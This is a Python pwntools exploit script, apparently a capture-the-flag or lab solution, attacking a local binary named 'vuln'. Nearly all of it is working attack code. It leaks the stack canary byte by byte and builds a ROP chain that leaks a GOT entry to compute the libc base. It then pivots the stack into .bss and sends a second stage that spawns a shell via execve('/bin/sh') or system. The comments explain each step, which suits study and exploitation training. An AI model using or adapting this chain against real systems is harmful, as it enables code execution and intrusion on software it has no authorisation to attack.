""" Exploit scenario:
- bypass canary and find canary value
- read stdin_got with write (fd=stdout) in payload1
- read from input and write to .bss location 
  (new rop chain after pivot here) in payload1
- pivot to bss location in payload1
- calculate bin_sh loaded with libc_base
- now send payload2 with ropchain to execve /bin/sh
"""
from pwn import *

r = process('./vuln')
libc = ELF('./libc-2.28.so')
binary = ELF('./vuln')

# Scanf blacklist characters, should not be in any part of payload
scanf_blacklist = ['09', '0a', '0b', '0c', '0d', '20']

x = raw_input('attach to gdb, then press enter....')


def get_canary_bit(num):
	r.recvuntil('get?\n')
	r.sendline(str(num))
	res = r.recvline()
	value = int(res.split('=')[1].strip())
	return value


# for Canary, First (with least value) byte is null \x00
# we should calculate other 7 bytes of canary value one by one. 
canary = '00'			
for i in range(1, 8):
	value = get_canary_bit(i)
	if hex(value)[2:] in scanf_blacklist:
		# If any other blacklist values in canary byte, then exit, we cant do anythigng with it
		# because scanf will ignore it and not pass that canary value. so smash stack will be detected
		print('illegal character for scanf found {}'.format(hex(value)[2:]))
		exit()
	canary = hex(value)[2:] + canary

canary = '0x' + canary
canary_int = int(canary, 16)

r.recv()

""" Useful Gadgets here
0x0000000000400f8f : syscall
0x0000000000400f63 : pop rdi ; ret
0x0000000000400f61 : pop rsi ; pop r15 ; ret
0x0000000000400f8c : pop rax ; pop rdi ; ret
0x0000000000400f88 : mov rdx, rsi ; ret
0x0000000000400288 : ret
0x0000000000400f5d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400288 : ret
"""
syscall = p64(0x0000000000400f8f)
pop_rax_rdi = p64(0x0000000000400f8c)
pop_rdi = p64(0x0000000000400f63)
pop_rsi_r15 = p64(0x0000000000400f61)
mov_rsi_in_rdx = p64(0x0000000000400f88)
ret = p64(0x0000000000400288)
pop_rsp___ = p64(0x0000000000400f5d)

"""
PAYLOAD Stage 1:
find libc location
print location of scanf in .got section, then find scanf location in libc,
then calculate libs_base addr and do the rest.

SOME NOTES:
	Some got locations, We can't use none of them, 
	because of 20 character that is invalid for scanf
		scanf_got = p64(binary.got['scanf'])		# 0x5020600000000000
		scanf = p64(binary.symbols['scanf'])		# 0xb009400000000000
	 	printf_got = p64(binary.got['printf'])		# 0x1820600000000000

	So we will use stdin_got or stdout_got, because they're always there loaded in memory
	and they're locations are fine with scanf.
"""

# Instead we will use stdin_got which is found in gdb with x/32xg ...
# we found a location after .got that holds a address which is in libc area
# stdin and stdout
stdin_got = p64(binary.got['stdin'])

""" Write to stdout the value at stdin_got location
%rax = 1
%rdi = 1   (stdout file descriptor)
%rsi = stdin_got location addres
%rdx = 8 (len to write to stdout from location of memory)
"""
payload1 = 'a' * 1032 + p64(canary_int) + 'b' * 8		# rbp = bbbbbbbb (not used here)
payload1 += pop_rax_rdi + p64(1) + p64(1) 
payload1 += pop_rsi_r15 + p64(8) + p64(0) + mov_rsi_in_rdx 
payload1 += pop_rsi_r15 + stdin_got + p64(0)
payload1 += syscall

"""
Now with syscall read from input again. 
So we can bypass scanf limitations in next payload2 sended with read syscall
"""
payload1 += pop_rax_rdi + p64(0) + p64(0)			# set rax=0 rdi=0
payload1 += pop_rsi_r15 + p64(128) + p64(0) + mov_rsi_in_rdx 

""" How bss address is choosed:
Because in final payload2 we will call system libc function, and system will need rsp location
to be writable, and because in that moment we did pivot to stack on bss location, we should find
an address that when it came to system it should be in .data location to be writable.

.data:   0000000000602096			(We will choose this location address)
# system will crash and cause error. at least require 0x2a0 on stack to get to system needed stack
# formule to calculate: hex(0x00000000006021AE-0x601f0e) = '0x2a0'
bss_adr = hex(0000000000602096+0x2a0)
"""
bss_adr = p64(0x602336)						# .bss location to write to: 0x602336
payload1 += pop_rsi_r15 + bss_adr + p64(0)	# set rsi=.bss location
payload1 += syscall

# Now pivot here ( change location of stack to our new bss address)
payload1 += pop_rsp___ + bss_adr

r.sendline(payload1)

r.recv()

# Now calculating the libc_base address to find real address for /bin/sh
stdin_leaked = u64(r.recv(6).ljust(8, '\x00'))
print('leaked stdin:\t{}'.format(hex(stdin_leaked)))


"""
** We should use _IO_2_1_stdin_ symbole to find libc base from stdin_got 

for i in libc.symbols:
	if 'stdin' in i:
		print(i)
_IO_2_1_stdin_
stdin
_IO_stdin
got._IO_2_1_stdin_
got.stdin
"""
stdin_libc = libc.symbols['_IO_2_1_stdin_']
print('offset stdin:\t{}'.format(hex(stdin_libc)))

libc_base = stdin_leaked - stdin_libc
print('libc base:\t\t{}'.format(hex(libc_base)))

# /bin/sh real address here
libc.address = libc_base
binsh = libc.search('/bin/sh').next()
print('/bin/sh:\t\t{}'.format(hex(binsh)))

""" Payload Stage 2 (sample1 - syscall execve)
Now send the new gadgets (these gadgets will be stored in new stack rsp location 
(in .bss that we changed before))
"""

# Payload below will be used to call syscall (execve) to execute /bin/bash
# Because after pivot, from pop_rsp___ program is still reading 3 left pop gadgets,
# we should provide 3 empty ones to pass them.
payload2 = p64(0) * 3
payload2 += pop_rax_rdi + p64(0x3b) + p64(binsh)
payload2 += pop_rsi_r15 + p64(0) + p64(0)
payload2 += pop_rsi_r15 + p64(0) + p64(0) + mov_rsi_in_rdx 
payload2 += syscall
payload2 += '\x90' * (128 - len(payload2))

""" Payload Stage 2 (sample2 - system of libc)
Another payload to do it with system symbols of libc
"""
payload2 = p64(0) * 3
system = p64(libc.symbols['system'])
payload2 += pop_rax_rdi + p64(0) + p64(binsh)
payload2 += system


r.sendline(payload2)

r.interactive()
